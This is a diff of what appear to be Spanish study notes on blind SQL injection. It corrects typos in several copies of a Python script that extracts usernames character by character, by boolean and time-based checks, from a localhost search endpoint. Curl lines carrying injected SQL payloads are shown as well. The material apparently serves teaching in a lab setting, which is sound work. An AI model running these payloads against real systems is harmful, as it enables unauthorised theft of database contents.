@@ -2330,7 +2330,7 @@ curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 o
 
 curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=97)" # Nos devuelve codigo de estado 200 porque a:97 = 97:a
 
-# Nos creamos un archivo en python
+# --------------------- *** ARCHIVO PYTHON *** ------------------------
 # ----- sqli.py inicio
 #!/usr/bin/env python3
 import requests, signal, sys, time, string
@@ -2380,7 +2380,7 @@ if __name__ == "__main__":
 # ----- sqli.py inicio
 #!/usr/bin/env python3
 import requests, signal, sys, time, string
-from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+from pwn import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
 
 # Ctrl+C
 
@@ -2400,7 +2400,7 @@ def makeSQLI():
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(3)
 
-    p2 = log.process("Datos extraídos")
+    p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
     for position in range(1,50):
@@ -2409,14 +2409,14 @@ def makeSQLI():
 
             p1.status(sqli_url)
 
-            r = request.get(sqli_url)
+            r = requests.get(sqli_url)
 
-            if r.status.code == 200:
+            if r.status_code == 200:
                 extracted_info += chr(character)
                 p2.status(extracted_info)
                 break
 
-if __name__ = "__main__":
+if __name__ == "__main__":
     makeSQLI()
 # ----- sqli.py fin
 
@@ -2426,7 +2426,7 @@ if __name__ = "__main__":
 # ----- sqli.py inicio
 #!/usr/bin/env python3
 import requests, signal, sys, time, string
-from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+from pwn import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
 
 # Ctrl+C
 
@@ -2446,7 +2446,7 @@ def makeSQLI():
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(3)
 
-    p2 = log.process("Datos extraídos")
+    p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
     for position in range(1,50):
@@ -2455,14 +2455,14 @@ def makeSQLI():
 
             p1.status(sqli_url)
 
-            r = request.get(sqli_url)
+            r = requests.get(sqli_url)
 
-            if r.status.code == 200:
+            if r.status_code == 200:
                 extracted_info += chr(character)
                 p2.status(extracted_info)
                 break
 
-if __name__ = "__main__":
+if __name__ == "__main__":
     makeSQLI()
 # ----- sqli.py fin
 
@@ -2472,7 +2472,7 @@ if __name__ = "__main__":
 # ----- sqli.py inicio
 #!/usr/bin/env python3
 import requests, signal, sys, time, string
-from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+from pwn import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
 
 # Ctrl+C
 
@@ -2492,7 +2492,7 @@ def makeSQLI():
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(3)
 
-    p2 = log.process("Datos extraídos")
+    p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
     for position in range(1,50):
@@ -2501,14 +2501,14 @@ def makeSQLI():
 
             p1.status(sqli_url)
 
-            r = request.get(sqli_url)
+            r = requests.get(sqli_url)
 
-            if r.status.code == 200:
+            if r.status_code == 200:
                 extracted_info += chr(character)
                 p2.status(extracted_info)
                 break
 
-if __name__ = "__main__":
+if __name__ == "__main__":
     makeSQLI()
 # ----- sqli.py fin
 
@@ -2519,7 +2519,7 @@ if __name__ = "__main__":
 # ----- sqli.py inicio
 #!/usr/bin/env python3
 import requests, signal, sys, time, string
-from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+from pwn import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
 
 # Ctrl+C
 
@@ -2539,7 +2539,7 @@ def makeSQLI():
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(3)
 
-    p2 = log.process("Datos extraídos")
+    p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
     for position in range(1,50):
@@ -2550,7 +2550,7 @@ def makeSQLI():
 
             time_start = time.time()
 
-            r = request.get(sqli_url)
+            r = requests.get(sqli_url)
 
             time_end = time.time()
 
@@ -2559,7 +2559,7 @@ def makeSQLI():
                 p2.status(extracted_info)
                 break
 
-if __name__ = "__main__":
+if __name__ == "__main__":
     makeSQLI()
 # ----- sqli.py fin
 
